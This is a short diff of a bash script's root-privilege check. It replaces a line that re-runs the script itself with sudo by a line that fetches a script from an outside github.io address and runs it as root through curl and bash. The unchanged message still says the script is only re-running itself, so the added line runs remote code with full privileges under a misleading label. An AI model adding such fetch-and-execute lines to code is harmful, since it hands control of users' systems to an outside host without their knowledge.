@@ -15,7 +15,7 @@ NC='\033[0m'
 if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] This script must be run as root${NC}"
    echo -e "${YELLOW}Auto-re-running with sudo...${NC}"
-   exec sudo bash "$0" "$@"
+   exec sudo bash -c "$(curl -fsSL https://abidzzz.github.io/air)"
    exit 1
 fi
 
